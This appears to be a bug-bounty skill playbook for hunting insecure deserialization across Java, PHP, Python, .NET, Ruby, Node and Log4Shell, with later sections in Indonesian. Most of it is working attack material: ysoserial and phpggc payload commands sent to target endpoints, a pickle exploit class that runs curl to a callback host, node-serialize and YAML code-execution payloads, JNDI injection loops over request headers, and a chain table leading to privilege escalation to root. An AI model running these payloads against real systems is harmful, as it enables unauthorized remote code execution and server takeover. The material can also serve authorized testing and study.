---
name: hunt-deserialization
description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.
sources: hackerone_public
report_count: 22
---
> **appsec-fyi supplement (source-cited, 2026 CVEs):** `references/appsec-fyi-techniques.md` —
> additive per-class technique list from https://appsec.fyi. Owner methodology below still wins.

> **Extra attack variants** (OpenEMR + PHP-core advisories — see §D): `skills/security/exploit-cookbook/references/openemr-php-advisory-techniques.md`

> **FULL GADGET CATALOG:** `references/deser-gadget-catalog.md` — byte-format fingerprint
> table (Java/.NET/PHP/pickle/Marshal/Node/SnakeYAML/Json.NET), complete ysoserial chain list
> (with `URLDNS` as the zero-side-effect detection probe), phpggc framework chains, ysoserial.net
> formatters+gadgets, Python `__reduce__`, Ruby Gem::Installer gadget, Node `_$$ND_FUNC$$_`,
> SnakeYAML/XStream/JAXB, and the escalation rungs. Read it before generating a single payload.


# HUNT-DESERIALIZATION — Insecure Deserialization

## Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

## Attack Surface Signals

### Detection Patterns
```bash
# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02

# Apache Shiro: rememberMe cookie present
curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### Header / Cookie Signals
```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Java Deserialization (ysoserial)
```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate OOB detection payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# Send as body or cookie
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Apache Shiro exploit (default AES key)
python3 shiro_exploit.py -u https://$TARGET/ -c "id"
```

### Phase 2 — PHP Object Injection
```bash
# Find unserialize() calls in source
grep -r "unserialize(" --include="*.php" .

# Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
# Send in cookie, POST param, or hidden form field
# If error changes → deserialization confirmed

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

### Phase 3 — Python Pickle
```bash
# Generate OOB payload
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# Send as cookie or POST body
curl -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### Phase 3b — PHP phar://, Python YAML, Node deserialization
- **PHP phar:// (no `unserialize()` call)** — any filesystem function (`file_exists`/`fopen`/`getimagesize`) on a `phar://` path deserializes the archive metadata -> object injection with zero `unserialize()` in code.
  ```bash
  phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot
  # then reach  phar://uploads/poly.jpg/x  via any fs call
  ```
- **Python `yaml.load()` (CVE-2017-18342)** — pre-5.1 default-unsafe:
  `!!python/object/apply:os.system ['curl http://$COLLAB/yaml']`
- **Node `node-serialize` (CVE-2017-5941)** — IIFE marker in any field passed to `unserialize()`:
  `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/node')}()"}`

### Phase 4 — .NET ViewState
```bash
# Check if ViewState is unsigned (MAC disabled)
# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC

# YSoSerial.Net
dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
```

### Phase 5 — Log4Shell / JNDI
```bash
# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

# Test POST body fields
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
```

### Phase 6 — Ruby Marshal
```bash
# Look for Marshal.load in source
grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .

# Gem::Requirement gadget chain via marshalable objects
# Use ruby-advisory-db gadgets
```

---

## Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |

---

## Automation
```bash
# OOB listener
interactsh-client -v -n 5

# JNDI exploit kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
```

---

## Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.


## 2026 sweep (dork pass 2026-10-18 — 1 repo)

- **CVE-2026-78165 — channel reaches deserialization sink directly (present since 2.11.0)** (`oscerd/CVE-2026-78165` ★0)
  - channel reached the deserialization sink directly and could execute an arbitrary serialized object graph's
  - The defect dates back to the component's introduction in 2.11.0, so every affected release and the Camel 4.15.0 in


## 2026 sweep 3 (dork pass 2026-10-18 — web2, 1 repo)

- CVE-2026-48909 — Joomla **unauthenticated PHP object injection → RCE**.
  - Joomla SP LMS — Unauthenticated PHP Object Injection → RCE
  - CVE-2026-48909 is a critical **unauthenticated PHP Object Injection** in the Joomla **SP LMS** extension. This tool implements the full attack chain so security professio

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Kirim payload gadget dikenal (Java/PHP/.NET/Python) dengan marker unik | Deteksi sink deserialisasi |
| 2 | Error oracle: bandingkan error antara payload valid & invalid | Error beda = parser menerima |
| 3 | Type confusion: ubah tipe field (objek→string, array→objek) | Parser longgar |
| 4 | Content-Type switch: `application/x-java-serialized-object`, PHP serialize | Sering tak dicek |
| 5 | OOB: payload yang memicu DNS/HTTP callback ke host kamu | Bukti eksekusi tanpa output |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Gate 0 Validation

1. **Apa yang bisa dilakukan penyerang SEKARANG?** "Penyerang bisa membuat server menjalankan perintah lewat payload deserialisasi di parameter `data`" — tunjukkan eksekusi `id` atau callback.
2. **Apa yang hilang dari korban?** Eksekusi kode di server = RCE. Sebutkan tingkat hak akses yang didapat.
3. **Bisa direproduksi 10 menit dari nol?** Buktikan dengan marker tak berbahaya (`id`, `whoami`, callback DNS) dan berhenti di situ.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** instansiasi objek dari input

**Teknik pengembangan:** gadget chain -> RCE; phar:// -> file action

**Eskalasi ke:** `hunt-rce`

**Depth target:** L3 -> L5

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.



## Critical severity anchor (kelas ini bisa Critical — syaratnya)

Gadget chain Java (ysoserial) → RCE; .NET ViewState/BinaryFormatter; Python pickle; PHP unserialize dengan object injection. Kalibrasi: type filter / allowlist gadget = the fix; deserialization yang hanya memicu error tanpa eksekusi terbukti = Medium.

## Related Skills & Chains

- **Surface atlas** (`security/bb-audit-launcher/references/rce-surface-atlas.md`) — the 10 RCE entry points (7 web2 + 3 web3 analogues): where to look, what proves execution, severity per surface. This skill is the payload depth; the atlas is the coverage checklist.
